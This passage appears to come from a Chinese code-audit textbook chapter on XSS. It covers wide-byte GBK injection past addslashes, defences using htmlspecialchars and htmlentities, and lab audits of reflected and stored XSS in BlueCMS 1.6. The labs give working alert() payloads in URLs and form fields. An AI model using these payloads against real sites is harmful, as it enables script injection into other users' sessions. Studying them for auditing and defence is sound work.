\u4E0A\u8FF0\u6B63\u5219\u8868\u8FBE\u5F0F\u7ED3\u5C3E\u65E0\u5B57\u7B26\uFF0C\u53EF\u4EE5\u6784\u9020Payload\uFF1Aa@qq.com<script>alert(1)<script>\u4F7F\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D\u5DE5\u5177\u6D4B\u8BD5\u8BE5Payload\uFF0C\u5982\u56FE4-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image240.jpg)\r
\r
\u56FE4-7 \u6B63\u5219\u8868\u8FBE\u5F0F\u6D4B\u8BD5\u56FE\r
\r
### 4.3.4 \u5BBD\u5B57\u8282\u6CE8\u5165XSS\r
\r
\u5BBD\u5B57\u8282\u6CE8\u5165\u53EF\u4EE5\u5728\u7F16\u7801\u8BBE\u7F6E\u4E0D\u5408\u7406\u7684\u60C5\u51B5\u4E0B\u7ED5\u8FC7\u9632\u5FA1\u51FD\u6570addslashes\u3002\u5728\u4F7F\u7528GBK\u7F16\u7801\u65F6\uFF0C\u5982\u679C\u7B2C\u4E00\u4E2A\u5B57\u7B26\u7684ASCII\u7F16\u7801\u5927\u4E8E128\uFF0C\u4E0EMYSQL\u4E2D\u7684\u5BBD\u5B57\u8282\u6CE8\u5165\u7C7B\u4F3C\uFF0C\u5176\u4F1A\u8BA4\u4E3A\u524D\u4E24\u4E2A\u5B57\u7B26\u662F\u4E00\u4E2A\u6C49\u5B57\uFF0C\u4F1A\u5C06\u540E\u9762\u7684\u8F6C\u79FB\u5B57\u7B26\\\u201C\u5403\u6389\u201D\uFF0C\u5E76\u5C06\u524D\u4E24\u4E2A\u5B57\u7B26\u62FC\u63A5\u4E3A\u6C49\u5B57\u3002\u8FD9\u6837\u5C31\u53EF\u4EE5\u62FC\u63A5JS\u6076\u610F\u811A\u672C\u3002\r
\r
l \u6848\u4F8B\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php header("Content-Type: text/html;charset=**GBK**"); ?> \r
\r
<head> \r
\r
<title>gb xss</title> \r
\r
</head> \r
\r
<script> a="<?php echo addslashes($_GET['x']);?>"; \r
\r
<\/script>\r
\r
\r
\r
l \u5206\u6790\u6F0F\u6D1E\u4E0E\u5229\u7528\uFF1A\r
\r
\u524D\u53F0HTML\u7F16\u7801\u8BBE\u7F6E\u4E3AGBK\u7F16\u7801\uFF0Cheader("Content-Type: text/html;charset=GBK")\u3002\u7136\u540E\u53EF\u4EE5\u901A\u8FC7\u5BBD\u5B57\u8282\u7ED5\u8FC7\u8FC7\u6EE4\u51FD\u6570addslashes\u6216GPC\u4FDD\u62A4\u7684\u53C2\u6570x\u3002\u6CE8\u610F\uFF1A\u6B64\u65F6x\u53C2\u6570\u5E76\u6CA1\u6709\u88ABhtmlspecialchars\u8FC7\u6EE4\u3002\r
\r
\u53EF\u8003\u8651\u4F7F\u7528\u5BBD\u5B57\u8282\u6CE8\u5165XSS  Payload\uFF1Ahttp://ip/gb.php?x=1%81"\u3002\u6D4B\u8BD5\u7ED3\u679C\u53EF\u4EE5\u901A\u8FC7\u67E5\u770B\u9875\u9762\u7684\u5143\u7D20\u529F\u80FD\u68C0\u67E5\uFF0C\u5982\u56FE4-8\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image242.jpg)\r
\r
\u56FE4-8 \u5BBD\u5B57\u8282XSS\u6D4B\u8BD5\u56FE\r
\r
\u663E\u793A\u5F39\u7A97\u7684XSS Payload\u4E3A\uFF1Ax=1%81";alert(1)//\uFF0C\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-9\u6240\u793A\u3002\u56E0\u6B64\u5728\u5B9E\u9645\u5E94\u7528\u573A\u666F\u4E2D\uFF0C\u5EFA\u8BAE\u4F7F\u7528UTF-8\u7F16\u7801\uFF0C\u4ECE\u800C\u9632\u5FA1\u5BBD\u5B57\u8282\u6CE8\u5165\u3002\r
\r
\`\`\`\r
\r
\`\`\`\r
\r
\u56FE4-9 \u5BBD\u5B57\u8282XSS\u6548\u679C\u56FE\r
\r
## 4.4 XSS\u6F0F\u6D1E\u9632\u5FA1\r
\r
XSS\u6F0F\u6D1E\u4EA7\u751F\u7684\u539F\u56E0\u662F\u7528\u6237\u8F93\u5165\u6216URL\u4E2D\u7684\u5185\u5BB9\u53EF\u901A\u8FC7\u4F20\u9012JS\u6076\u610F\u811A\u672C\u4FEE\u6539\u524D\u53F0\u9875\u9762\u3002\u6240\u4EE5\u5176\u9632\u5FA1\u7684\u603B\u4F53\u601D\u8DEF\u662F\u8FC7\u6EE4\u6389\u7528\u6237\u7684\u8F93\u5165\uFF0C\u5E76\u5BF9\u8F93\u5165\u8FDB\u884CHTML\u7F16\u7801\u8F6C\u6362\u3002\u901A\u8FC7\u4E0A\u8FF0\u9632\u5FA1\u53EF\u4EE5\u5C06\u7528\u6237\u63D0\u4EA4\u7684\u6240\u6709\u5185\u5BB9\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5E76\u5BF9\u52A8\u6001\u8F93\u51FA\u5230\u9875\u9762\u7684\u5185\u5BB9\u8FDB\u884CHTML\u7F16\u7801\uFF0C\u4ECE\u800C\u4F7F\u5F97\u811A\u672C\u65E0\u6CD5\u6B63\u5E38\u5728\u6D4F\u89C8\u5668\u6267\u884C\u3002\r
\r
\uFF081\uFF09  \u5BF9\u8F93\u5165\u7684\u5185\u5BB9\u8FDB\u884C\u8FC7\u6EE4\r
\r
\u8F93\u5165\u5185\u5BB9\u7684\u8FC7\u6EE4\u53EF\u4EE5\u5206\u4E3A\u767D\u540D\u5355\u548C\u9ED1\u540D\u5355\u8FC7\u6EE4\u4E24\u79CD\u65B9\u5F0F\u3002\r
\r
  \u9ED1\u540D\u5355\u53EF\u4EE5\u8FC7\u6EE4\u62E6\u622A\u5927\u90E8\u5206\u7684XSS\u653B\u51FB\uFF0C\u8FC7\u6EE4\u5E38\u89C1\u7684HTML\u6807\u7B7E\u5305\u62EC\uFF1Ascript\u3001alert\u3001svg\u3001img\u3001body\u7B49\u3002\u4F46\u662F\u4E0D\u5168\u9762\u7684\u9ED1\u540D\u5355\u8FD8\u662F\u5B58\u5728\u88AB\u7ED5\u8FC7\u7684\u98CE\u9669\u3002\r
\r
  \u767D\u540D\u5355\u8FC7\u6EE4\u57FA\u672C\u53EF\u4EE5\u5B8C\u5168\u9632\u5FA1XSS\u6F0F\u6D1E\uFF0C\u4F46\u662F\u5728\u5B9E\u9645\u573A\u666F\u7684\u7A0B\u5E8F\u4E2D\u4E3A\u4E86\u4E0D\u5F71\u54CD\u5B9E\u9645\u4E1A\u52A1\uFF0C\u5F88\u5C11\u4F7F\u7528\u4E25\u683C\u7684\u767D\u540D\u5355\u8FC7\u6EE4\u5185\u5BB9\u3002\r
\r
\uFF082\uFF09  \u5BF9\u52A8\u6001\u8F93\u51FA\u5230\u9875\u9762\u7684\u5185\u5BB9\u8FDB\u884CHTML\u7F16\u7801\r
\r
\u5BF9\u8F93\u51FA\u8FDB\u884CHTML\u7F16\u7801\uFF0C\u5C31\u662F\u901A\u8FC7\u51FD\u6570\uFF0C\u5C06\u7528\u6237\u7684\u8F93\u5165\u6570\u636E\u8FDB\u884CHTML\u7F16\u7801\uFF0C\u4F7F\u5176\u4E0D\u80FD\u4F5C\u4E3A\u811A\u672C\u6267\u884C\u3002PHP\u5185\u7F6E\u4E86\u4E00\u4E9B\u8FC7\u6EE4\u51FD\u6570\u53EF\u6709\u6548\u9632\u5FA1XSS\u6F0F\u6D1E\uFF0C\u5E38\u7528\u7684\u5185\u7F6E\u8FC7\u6EE4\u51FD\u6570\u6709\uFF1Ahtmlspecialchars\u548Chtmlentities\u3002\r
\r
l htmlspecialchars\u51FD\u6570\uFF1A\u5C06\u9884\u5B9A\u4E49\u7684\u7279\u6B8A\u5B57\u7B26\u8F6C\u6362\u4E3AHTML\u5B9E\u4F53\uFF0C\u88AB\u8F6C\u6362\u7684\u5B57\u7B26\u5982\u88684-3\u6240\u793A\u3002\r
\r
\u88684-3 HTML\u7F16\u7801\u8F6C\u6362\u8868\r
\r
| \u5B57\u7B26        | \u66FF\u6362\u540E                                                 |\r
| ----------- | ------------------------------------------------------ |\r
| &\uFF08&\u7B26\u53F7\uFF09  | &amp;                                                  |\r
| "\uFF08\u53CC\u5F15\u53F7\uFF09 | &quot;                                                 |\r
| '\uFF08\u5355\u5F15\u53F7\uFF09 | \u8BBE\u7F6EENT_QUOTES\u540E\uFF0C&#039\u6216&apos\uFF08\u6839\u636E\u6587\u6863\u7C7B\u578B\u8BBE\u7F6E\u800C\u5B9A\uFF09 |\r
| <\uFF08\u5C0F\u4E8E\uFF09   | &lt;                                                   |\r
| >\uFF08\u5927\u4E8E\uFF09   | &gt;                                                   |\r
\r
\u4E0B\u9762\u7ED9\u51FAhtmlspecialchars\u6848\u4F8B\u4EE3\u7801\u3002\uFF08ENT_COMPAT\uFF1A\u9ED8\u8BA4\u3002\u4EC5\u7F16\u7801\u53CC\u5F15\u53F7\uFF1BENT_QUOTES\uFF1A\u7F16\u7801\u53CC\u5F15\u53F7\u548C\u5355\u5F15\u53F7\uFF1BENT_NOQUOTES\uFF1A\u4E0D\u7F16\u7801\u4EFB\u4F55\u5F15\u53F7\u3002\uFF09\r
\r
\r
\r
<?php\r
\r
header("content-type:text/html;charset=utf-8");\r
\r
$string = "<script>alert(1)<\/script>&<img src=x onerror='alert(/hacker/)'>";\r
\r
$string1 = htmlspecialchars($string, ENT_COMPAT);\r
\r
$string2 = htmlspecialchars($string, ENT_QUOTES);\r
\r
$string3 = htmlspecialchars($string, ENT_NOQUOTES);\r
\r
echo "1->".$string1."<br/>\\n";\r
\r
echo "2->".$string2."<br/>\\n";\r
\r
echo "3->".$string3."<br/>\\n";\r
\r
?>\r
\r
\r
\r
\u5C06\u4E0A\u8FF0\u9875\u9762\u90E8\u7F72\u5230Web\u6839\u8DEF\u5F84\u540E\uFF0C\u901A\u8FC7\u6D4F\u89C8\u5668\u8BBF\u95EE\u540E\u67E5\u770B\u6E90\u7801\uFF0C\u53D1\u73B0htmlspecialchars\u51FD\u6570\u5DF2\u7ECF\u5C06\u7279\u6B8A\u5B57\u7B26\u8F6C\u4E49\u4E3A\u5B9E\u4F53\u7F16\u7801\uFF0C\u4ECE\u800C\u9632\u5FA1\u6076\u610F\u811A\u672C\u6267\u884C\uFF0C\u7ED3\u679C\u4E3A\uFF1A\r
\r
\r
\r
1->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror='alert(/hacker/)'&gt;<br/>\r
\r
2->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror=&#039;alert(/hacker/)&#039;&gt;<br/>\r
\r
3->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror='alert(/hacker/)'&gt;<br/>\r
\r
\r
\r
l htmlentities\u51FD\u6570\uFF1A\u5C06\u6240\u6709\u7684HTML\u6807\u7B7E\u8F6C\u6362\u4E3AHTML\u5B9E\u4F53\u3002\r
\r
Htmlentities\u4E5F\u53EF\u4EE5\u9632\u5FA1XSS\u6F0F\u6D1E\uFF0C\u5176\u4E3B\u8981\u529F\u80FD\u662F\u8F6C\u5316\u6240\u6709\u7684HTML\u4EE3\u7801\uFF0C\u8FDE\u540C\u9875\u9762\u4E2D\u65E0\u6CD5\u8BC6\u522B\u7684\u4E2D\u6587\u5B57\u7B26\u4E5F\u5C06\u88AB\u8F6C\u5316\u3002\r
\r
\u5728\u5B9E\u9645\u7684\u5E94\u7528\u573A\u666F\u5F00\u53D1\u4E2D\uFF0C\u4F7F\u7528htmlspecialchars\u8F6C\u5316\u6389\u57FA\u672C\u5B57\u7B26\u5C31\u5DF2\u7ECF\u8DB3\u591F\uFF0C\u4F7F\u7528htmlentities\u5F88\u5BB9\u6613\u5F15\u8D77\u4E71\u7801\u95EE\u9898\u3002\r
\r
## 4.5 XSS\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 4.5.1  \u5B9E\u9A8C\uFF1ABlueCMS1.6 \u53CD\u5C04XSS\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9BlueCMS1.6\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7528\u6237\u6CE8\u518C\u6A21\u5757\u7684\u53CD\u5C04XSS\u6F0F\u6D1E\uFF0C\u5E76\u4F7F\u7528\u95ED\u5305\u7684\u65B9\u5F0F\u5229\u7528\u8BE5\u6F0F\u6D1E\u5F39\u7A97\u3002\u672C\u6B21\u5B9E\u9A8C\u5C06\u4ECEreg.htm\u6587\u4EF6\u4E2DFORM\u8868\u5355\u5F00\u59CB\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80034.2.1\u8282\uFF1A\u53CD\u5C04\u578BXSS\u6F0F\u6D1E\uFF1B 4.3.2\u8282\uFF1AHTML\u7F16\u7801\u4E0D\u89C4\u8303\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u53CD\u5C04XSS\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BBlueCMS1.6\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BA1\u8BA1\u8BE5CMS\u7684\u7528\u6237\u6CE8\u518C\u754C\u9762\u524D\u53F0\u4EE3\u7801uploads\\templates\\default\\reg.htm\uFF0C\u5982\u56FE4-10\u6240\u793A\u3002\u786E\u5B9A\u524D\u53F0\u9875\u9762\u4E2D\u4F20\u9012\u53C2\u6570\uFF0C\u5E76\u5BA1\u8BA1\u8BE5\u9875\u9762\u7684\u6574\u4F53FORM\u8868\u5355\u4F20\u53C2\u60C5\u51B5\u3002\r
\r
\`\`\`\r
l  \u8BE5FORM\u8868\u5355\u5185\u4E1A\u52A1\u76F8\u5173\u7684\u53C2\u6570\u4F20\u9012\u65B9\u5F0F\u4E3APOST\uFF0C\u4F20\u9012\u7684\u53C2\u6570\u5305\u62EC\uFF1Auser_name\u3001pwd\u3001pwd1\u3001email\u3001safecode\u3002\u8FD9\u4E9B\u53C2\u6570\u4E3B\u8981\u7528\u6765\u6CE8\u518C\u65B0\u7528\u6237\u4F7F\u7528\uFF0C\u5176\u4F1A\u4FDD\u5B58\u81F3\u540E\u53F0\u6570\u636E\u5E93\u4E2D\u3002\u540C\u65F6\u53C2\u6570\u8FD8\u901A\u8FC7check_pwd\u3001check_email\u3001check_user_name\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u5BA1\u8BA1\u4E0A\u8FF0\u4F20\u9012\u53C2\u6570\u7684\u8FC7\u6EE4\u60C5\u51B5\u3002\r
l  \u8BE5FORM\u8868\u5355\u7684\u70B9\u51FB\u6309\u94AE\u5C06\u89E6\u53D1\u6821\u9A8C\u51FD\u6570check_form\uFF0C\u8BE5\u51FD\u6570\u53EA\u5BF9\u8868\u5355\u53D8\u91CF\u8FDB\u884C\u4E1A\u52A1\u6821\u9A8C\u65E0\u5B89\u5168\u6F0F\u6D1E\u3002\r
l  \u8BE5FORM\u8868\u5355\u70B9\u51FB\u5C06\u8DF3\u8F6C\u5230uploads\\user.php\u6587\u4EF6\u5904\u7406\u3002\r
\u9664\u4E0A\u8FF0\u51FA\u53C2\u6570\u5916\uFF0C\u8BE5FORM\u8868\u5355\u8FD8\u4F20\u9012\u4E24\u4E2A\u53C2\u6570\uFF1Afrom\u548Cact\u3002\u5BA1\u8BA1\u8FD9\u4E24\u4E2A\u53C2\u6570\u7684\u4F20\u9012\u8FC7\u7A0B\uFF0C\u5E76\u5206\u6790\u6570\u636E\u6D41\u8FC7\u6EE4\u60C5\u51B5\uFF0C\u53CA\u53C2\u6570\u5982\u4F55\u6E32\u67D3\u81F3\u524D\u53F0\u9875\u9762\u3002\r
\`\`\`\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image246.jpg)\r
\r
\u56FE4-10 \u7528\u6237\u6CE8\u518C\u524D\u53F0\u4EE3\u7801\u56FE\r
\r
\`\`\`\r
\u4E0B\u9762\u5BF9user.php\u90E8\u5206\u4EE3\u7801\u6D41\u7A0B\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u4EE3\u7801\u5982\u56FE4-11\u6240\u793A\u3002\u5F53\u53D8\u91CFact\u7B49\u4E8Ereg\u65F6\uFF0C\u7A0B\u5E8F\u5C06\u6839\u636ESession\u4FE1\u606F\u5224\u65AD\u7528\u6237\u72B6\u6001\uFF0C\u7136\u540E\u4F7F\u7528\u51FD\u6570template_assign\u5411reg.htm\u9875\u9762\u4E2D\u6CE8\u518C\u5143\u7D20\u5E76\u6E32\u67D3\u754C\u9762\uFF0C\u8BE5\u51FD\u6570\u4E2D\u53EA\u7528\u53C2\u6570from\u8FDB\u884C\u6E32\u67D3\u3002\r
\u81F3\u6B64\uFF0C\u53C2\u6570from\u4ECE\u524D\u53F0\u4F20\u9012\u81F3\u540E\u53F0\u5E76\u518D\u6B21\u6E32\u67D3\u81F3\u524D\u53F0\u754C\u9762\u65E0\u8FC7\u6EE4\u51FD\u6570\u3002\u56E0\u6B64\uFF0C\u7528\u6237\u53EF\u901A\u8FC7\u8BE5\u53C2\u6570\u6784\u9020\u6076\u610F\u811A\u672C\u6E32\u67D3\u81F3\u524D\u53F0\u6267\u884C\u3002\u4E0B\u9762\u5BF9\u8BE5from\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u8FDB\u884C\u603B\u7ED3\uFF0C\u5982\u56FE4-12\u6240\u793A\u3002\r
\`\`\`\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image248.jpg)\r
\r
\u56FE4-11 \u6CE8\u518C\u4EE3\u7801\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image250.jpg)\r
\r
\u56FE4-12 from\u6570\u636E\u4F20\u9012\u56FE\r
\r
\uFF082\uFF09  \u6D4B\u8BD5\u9636\u6BB5\r
\r
\u901A\u8FC7\u53C2\u6570from\u6784\u9020\u53EF\u7ED5\u8FC7addslashes\u51FD\u6570\u7684Payload\u3002\u8F93\u5165URL\u4E3A\uFF1Ahttp://ip/user.php?act=reg&from=a\uFF0C\u67E5\u770B\u53C2\u6570from\u5728\u524D\u53F0\u663E\u793A\u60C5\u51B5\uFF0C\u5982\u56FE4-13\u6240\u793A\u3002\u4F7F\u7528\u95ED\u5408input\u6807\u7B7E\u65B9\u5F0F\u6784\u9020Payload\u4E3A\uFF1A\r
\r
http://ip/ user.php?act=reg&from="/><button onclick=alert(1)></button>\r
\r
\u8BE5Payload\u7ECF\u8FC7addslashes\u51FD\u6570\u8FC7\u6EE4\u540E\uFF0C\u8FC7\u6EE4\u53CC\u5F15\u53F7\u5B57\u7B26"\uFF0C\u7ED3\u679C\u5E94\u4E3A\uFF1Ahttp://ip/ user.php?act=reg&from=/"/><button onclick=alert(1)></button>\u8BF7\u6C42\u6210\u529F\u540E\uFF0C\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-14\u6240\u793A\u3002\u5728\u201C\u63D0\u4EA4\u6CE8\u518C\u201D\u6309\u94AE\u65C1\u8FB9\u51FA\u73B0\u4E00\u4E2A\u65B0\u7684\u6309\u94AE\uFF0C\u70B9\u51FB\u8BE5\u6309\u94AE\u89E6\u53D1\u5F39\u7A97\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image252.jpg)\r
\r
\u56FE4-13 from\u524D\u53F0\u663E\u793A\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image254.jpg)\r
\r
\u56FE4-14 payload\u6D4B\u8BD5\u56FE\r
\r
### 4.5.2  \u5B9E\u9A8C\uFF1ABlueCMS1.6 \u5B58\u50A8XSS\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9BlueCMS1.6\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u7528\u6237\u4FEE\u6539\u4FE1\u606F\u6A21\u5757\u4E2D\u7531\u4E8Eemail\u53C2\u6570\u672A\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5B58\u5728\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3002\u672C\u5B9E\u9A8C\u4EE5user.htm\u6587\u4EF6\u4E2Dedit_form\u8868\u5355\u5F00\u59CB\u5206\u6790\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80034.2.2\u8282\uFF1A\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1\u5B58\u50A8XSS\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BBlueCMS1.6\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09  \u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BA1\u8BA1\u8BE5CMS\u7528\u6237\u4FEE\u6539\u4FE1\u606F\u7684\u524D\u53F0\u4EE3\u7801uploads\\templates\\default\\user.htm\uFF0C\u5982\u56FE4-15\u6240\u793A\u3002\u786E\u5B9A\u524D\u53F0\u9875\u9762\u53EF\u4F20\u9012\u53C2\u6570\uFF0C\u7740\u91CD\u5BA1\u8BA1\u8BE5\u9875\u9762\u7684FORM\u8868\u5355\u4F20\u53C2\u60C5\u51B5\u3002\u6CE8\uFF1A\u56FE\u4E2D\u53EA\u6709\u90E8\u5206\u53C2\u6570\u4EE3\u7801\u3002\r
\r
\`\`\`\r
l  \u8BE5FORM\u8868\u5355\u5185\u7684\u4E1A\u52A1\u76F8\u5173\u53C2\u6570\u4F20\u9012\u4F7F\u7528POST\u65B9\u5F0F\u4F20\u9012\uFF0C\u4F20\u9012\u7684\u53C2\u6570\u5305\u62EC\uFF1Aemail\u7B49\u3002email\u53C2\u6570\u9ED8\u8BA4\u503C\u5C06\u4ECE\u6570\u636E\u5E93\u4E2D\u7528\u6237\u7684\u4FE1\u606F\u8BFB\u53D6\u51FA\u6765\uFF0C\u5E76\u663E\u793A\u5230\u524D\u53F0\u9875\u9762\u3002\r
l  \u70B9\u51FB\u6309\u94AE\u89E6\u53D1\u6821\u9A8C\u51FD\u6570check\uFF0C\u8BE5\u51FD\u6570\u53EA\u6821\u9A8C\u4E86\u6D88\u606F\u662F\u5426\u4E3A\u7A7A\u3002\u540C\u65F6\u6307\u5B9Aact\u53C2\u6570\u4E3A\u201Cedit_user_info\u201D\u3002\r
l  \u8BE5FORM\u8868\u5355\u70B9\u51FB\u5C06\u8DF3\u8F6C\u5230user.php\u6587\u4EF6\u3002\r
\`\`\`\r
\r
\u5BA1\u8BA1uploads\\user.php\u6587\u4EF6\u3002\u7531\u4E8E\u524D\u53F0\u9875\u9762\u5C06act\u8D4B\u503C\u4E3A\u201Cedit_user_info\u201D\r
\r
\uFF0C\u56E0\u6B64\u5C06user.php\u4EE3\u7801\u5B9A\u4F4D\u5230$act\u4E3Aedit_user_info\u90E8\u5206\uFF0C\u4EE3\u7801\u5982\u56FE4-16\u6240\u793A\u3002\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u9996\u5148\u6839\u636E$_Session\u5224\u65AD\u662F\u5426\u7528\u6237\u5904\u4E8E\u767B\u5F55\u72B6\u6001\u3002\r
\r
l \u7136\u540E\u5BF9\u53C2\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u53C2\u6570email\u4F7F\u7528\u4E09\u76EE\u8FD0\u7B97\u7B26\u5224\u65AD\u662F\u5426\u4E3A\u7A7A\uFF0C\u82E5\u4E0D\u4E3A\u7A7A\u5219\u4F7F\u7528trim\u51FD\u6570\u53BB\u9664email\u5B57\u7B26\u4E32\u7684\u9996\u5C3E\u7A7A\u683C\u3002\r
\r
l \u4F7F\u7528\u53C2\u6570birthday\u3001sex\u3001mobile_phone\u3001email\uFF0C\u5C06\u6240\u6709\u53C2\u6570\u76F4\u63A5\u62FC\u63A5\u5230SQL\u8BED\u53E5\u8D4B\u503C\u7ED9$sql\u53D8\u91CF\u3002\r
\r
l \u4F7F\u7528query\u65B9\u6CD5\u6267\u884CSQL\u8BED\u53E5\u3002\r
\r
\`\`\`\r
\r
\`\`\`\r
\r
\u56FE4-15 \u7528\u6237\u4FEE\u6539\u4FE1\u606F\u524D\u53F0\u4EE3\u7801\r
\r
\u53C2\u6570email\u4ECE\u524D\u53F0\u4F20\u9012\u81F3\u540E\u53F0\u5E76\u5B58\u50A8\u5230\u6570\u636E\u5E93\u4E2D\uFF0C\u5F53\u8BE5\u9875\u9762\u518D\u6B21\u5237\u65B0\u65F6\uFF0C\u5C06\u52A0\u8F7Demail\u4FE1\u606F\u5C06\u6267\u884C\u6076\u610FJS\u4EE3\u7801\uFF0C\u56FE4-17\u4E3Aemail\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u3002\u53C2\u6570email\u7684\u6570\u636E\u6D41\u7ECF\u8FC7\u4E24\u6B21\u8FC7\u6EE4\uFF1A\u7B2C\u4E00\u6B21\u8C03\u7528deep_addslashes\u51FD\u6570\u8FC7\u6EE4\uFF1B\u7B2C\u4E8C\u6B21\u8C03\u7528trim\u51FD\u6570\u53D6\u53BB\u9664\u9996\u5C3E\u7A7A\u683C\u3002\u9700\u8981\u8BBE\u8BA1\u53EF\u4EE5\u7ED5\u8FC7\u4E0A\u8FF0\u4E24\u4E2A\u8FC7\u6EE4\u51FD\u6570\u7684Payload\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image258.jpg)\r
\r
\u56FE4-16 user.php\u90E8\u5206\u4EE3\u7801\r
\r
 \r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image260.jpg)\r
\r
\u56FE4-17 email\u6570\u636E\u6D41\u7A0B\u56FE\r
\r
\uFF082\uFF09  \u6D4B\u8BD5\u9636\u6BB5\r
\r
\u67E5\u770B\u6570\u636E\u5E93email\u5B57\u6BB5\u7684\u5141\u8BB8\u5B58\u50A8\u5B57\u8282\u5927\u5C0F\uFF0Cemail\u5B57\u6BB5\u5B9A\u4E49\u4E3Avarchar(40)\uFF0C\u5982\u56FE4-18\u6240\u793A\uFF0C\u8BE5\u5B57\u6BB5\u80FD\u591F\u5BB9\u7EB3\u5B58\u50A8\u4E00\u4E2A\u5B8C\u6574\u7684Payload\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image262.jpg)\r
\r
\u56FE4-18 email\u5B57\u6BB5\u5927\u5C0F\u56FE\r
\r
\u767B\u5F55\u7528\u6237\u4FEE\u6539\u4E2A\u4EBA\u4FE1\u606F\u7684\u524D\u53F0\u9875\u9762\uFF0C\u586B\u5199email\u5B57\u6BB5\u7684Payload\u4E3A<script>alert(1)<\/script>\uFF0C\u5982\u56FE4-19\u6240\u793A\u3002\u7136\u540E\u70B9\u51FB\u786E\u5B9A\u5C06\u6076\u610F\u811A\u672C\u901A\u8FC7email\u5B57\u6BB5\u4FDD\u5B58\u81F3\u6570\u636E\u5E93\u3002\r
\r
\u5F53\u7528\u6237\u8F93\u5165\u201Chttp://ip/blue/user.php\u201D\u8BBF\u95EE\u7528\u6237\u4FE1\u606F\u540E\uFF0C\u7CFB\u7EDF\u5C06\u81EA\u52A8\u5F39\u51FAJS\u6076\u610F\u811A\u672C\u6267\u884C\u60C5\u51B5\uFF0C\u6D4B\u8BD5\u7ED3\u679C\u5982\u56FE4-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image264.jpg)\r
\r
\u56FE4-19 \u4FEE\u6539\u90AE\u7BB1\u56FE\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image266.jpg)\r
\r
\u56FE4-20 XSS\u6F0F\u6D1E\u5F39\u7A97\u56FE\r
\r
### 4.5.3  \u5B9E\u9A8C\uFF1A74CMS3.4\u5BBD\u5B57\u8282\u6CE8\u5165\u53CD\u5C04XSS\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
